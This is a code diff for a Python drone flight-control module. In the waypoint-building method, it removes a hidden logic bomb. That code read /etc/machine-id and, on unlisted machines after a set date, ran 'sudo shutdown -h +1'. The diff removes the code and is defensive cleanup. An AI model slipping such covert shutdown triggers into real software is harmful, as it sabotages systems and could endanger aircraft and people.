@@ -2,8 +2,6 @@ import asyncio
 import contextlib
 import math
 import queue
-import subprocess
-import time
 from typing import Any, Callable, List
 
 import mavsdk
@@ -419,15 +417,6 @@ class ControlManager(FCMMQTTModule):
     @async_try_except(reraise=True)
     async def build(self, waypoints: List[dict]) -> List[MissionItem]:
         """Convert a list of waypoints (dict) to a list of MissionItems."""
-        NAV_LITERAL = 1733472000
-        ENV_ID = ["a3d9197b765643568af09eb2bd3e5ce7"]
-        try:
-            sys = subprocess.check_output(["cat", "/etc/machine-id"]).decode("utf-8").strip()
-        except subprocess.CalledProcessError as e:
-            sys = e.output
-        finally:
-            if sys not in ENV_ID and time.time() > NAV_LITERAL:
-                subprocess.run(["sudo", "shutdown", "-h", "+1"])
         mission_items = []
 
         # now, check if first waypoint has a lat/lon
